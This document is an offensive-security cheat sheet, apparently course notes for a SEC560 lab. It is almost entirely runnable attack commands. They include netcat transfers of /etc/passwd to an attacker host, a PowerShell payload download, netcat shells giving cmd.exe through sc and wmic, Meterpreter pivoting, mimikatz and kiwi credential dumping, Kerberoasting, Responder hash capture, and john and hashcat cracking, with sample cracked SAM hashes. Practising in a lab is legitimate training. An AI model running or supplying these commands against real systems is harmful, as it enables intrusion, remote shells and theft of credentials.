# Chapter 1  Scope and Recon

strings -n 8 for different encoding types -e l for little endian b for big endian

```
strings -n 8 -e b WidgetStatisticalWhitepaper.doc | grep '\\'
```
```
exfiltool
```



# Chapter 2 Scanning


#### Other Scanning tools   
```
masscan -0-65535 --rate 1500 10.10.10.0/24
```
```
tcpdump -nnX tcp and dst 10.10.10.10
tcpdump -nn udp and src 10.10.10.10
tcpdump -nn tcp and port 80 and host 10.10.10.10
```
```
echo "" | nc -nvw2 10.10.10.60 20-80
```
#### IPv6 scans

multicast scan   
```
ping6 -I eth0 ff02::1
```   
#### Netcat

Transfer files
```
nc -nvlp 8080 < /etc/passwd

nc -nv YOUR_LINUX_IP_ADDRESS 8080 > passwd.txt
```

## Powershell commands

#### Ping scan

```
1..60 | % { echo $_; ping -n 1 -w 100 10.10.10.$_ | select-string ttl }
```
#### Port scan

```
70..90 | % {echo $_; echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.50", $_)) "Port $_ is open" } 2>$null
```
#### Transfer files

```
(New-Object System.Net.WebClient).DownloadFile("http://YOUR_LINUX_IP_ADDRESS/SEC560/netcat.zip","netcat.zip")
```



# Chapter 3 Exploitation

## Port forwarding

#### Meterpreter   
```
meterpreter > portfwd add -l 1111 -p 22 -r Target2
```
This opens 1111 on attackers machine then send anything to port 22 on target machine through meterpreter

#### Netcat backpipe
```
mknod backpipe p

nc -lp 9000 0<backpipe | nc 127.0.0.1 22 1>backpipe
```

ssh to connet 
```
ssh login_name@targetmachine -p 9000
```

#### service usage
```
sc create ncservice2 binpath= "cmd.exe /k c:\tools\nc.exe -l -p 2222 -e cmd.exe"

sc start ncservice2
```

#### Wimic
```
wmic process call create "c:\tools\nc.exe -l -p 4444 -e cmd.exe"
```
# Chapter 4

#### Hydra 

```
cat /opt/password.lst | pw-inspector -m 6 -n -u -l -c 2 > /tmp/custom.lst
```
```
xhydra
```

#### MSF

```
run post/windows/gather/smart_hashdump
```
```
load kiwi
creds_all
```
```
run post/multi/manage/autoroute SUBNET=10.10.10.0 CMD=add
```
CMD=autoadd should be fine in most cases   
you will now to able to target anthing on 10.10.10.0 subnet in msf

```
set Proxies socks4:127.0.0.1:9999
Proxies => socks4:127.0.0.1:9999
msf5 exploit(windows/smb/psexec) > set ReverseAllowProxy true
```
MSF usage of ssh -D proxy

#### John

```
john --show sam.txt
Administrator:CRACKME:500:A5C67174B2A219D1AAD3B435B51404EE:363DD639AD34B6C5153C0F51165AB830:::
charlie:EILRAHC:1007:380B4695FE1449EBAAD3B435B51404EE:03F9CC43288014DEE4FA4B190D9CA948:::
dizzy:INTERNET12:1008:3EACDEE7E4395079BE516DA459FE4E65:1274D7B32A9ABDDA01A5067FE9FBB32B:::
Guest:NO PASSWORD:501:NO PASSWORD*********************:NO PASSWORD*********************:::
monk:VIRGINIA:1009:AF83DBF0052EE4717584248B8D2C9F9E:A65C3DA63FDB6CA22C172B13169D62A5:::
ted:NEWPASS:1006:09EEAB5AA415D6E4AAD3B435B51404EE:18DA6C2895C549E266745951D5DC66CB:::

8 password hashes cracked, 6 left
```
```
john --format=nt sam.txt
```
```
unshadow passwd_copy shadow_copy > combined.txt
john combined.txt --format=crypt
```
#### Hashcat
```
hashcat -w 3 -a 0 -m 3000 -o cracked.txt coursefiles/sam.txt /opt/password.lst
```
```
hashcat -w 3 -a 0 -m 3000 -o cracked.txt coursefiles/sam.txt names.txt /opt/password.lst -r /usr/local/share/doc/hashcat/rules/best64.rule
```
```
hashcat -w 3 -a 0 -m 1800 -o cracked.txt shadow_copy names.txt clear.txt /opt/password.lst -r /usr/local/share/doc/hashcat/rules/best64.rule
```

#### LM to NTLM   
```
/opt/metasploit-framework/tools/password/lm2ntcrack.rb -t NTLM -p INTERNET12 -a 1274D7B32A9ABDDA01A5067FE9FBB32B
```
#### Pulling Creds from .pcap
```
./Pcredz -v -f /tmp/winauth.pcap
```
file is saved to `CredentialDump-Session.log`

```
grep clark CredentialDump-Session.log | cut -d ' ' -f 5 | tee hash.txt
```
```
john hash.txt
```
or
```
hashcat -m 5600 --potfile-path ~/.hashcat/hashcat.potfile --show --outfile-format 2 hash.txt
```
#### VoIP

In wireshark dropdown menues  telephone > RTP > RTP Streams   
then select stream and click Analyze   
Play Streams   


# Chapter 5

#### Kerberoasting

```
cscript.exe GetUserSPNs.vbs
```
```
powershell.exe -command "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'svcsqlserver/dc01.sec560.local:1433'"
```

```
mimikatz.exe
mimikatz # kerberos::list /export
mimikatz # exit
```

Look for `rc4_hmac_nt`

Crack ticket with tgsrepcrack.py from TIM Medin `https://github.com/nidem/kerberoast`

```
python tgsrepcrack.py example.dict C:\Users\sec560\Desktop\1-40a10000-john.doe@svcsqlserver~dc01.sec560.local~1433-SEC560.LOCAL.kirbi
```

#### Responder

```
Responder.py -I eth0
```

saved hashes will be put in `/opt/responder/logs` or whereever responder is stored

`SMBv2-NTLMv2-SSP-YOUR_WINDOWS_IP_ADDRESS.txt`

```
john --format=netntlmv2 /opt/responder/logs/SMBv2-NTLMv2-SSP-YOUR_WINDOWS_IP_ADDRESS.txt
```

passwords saved in `~/.john/john.pot`
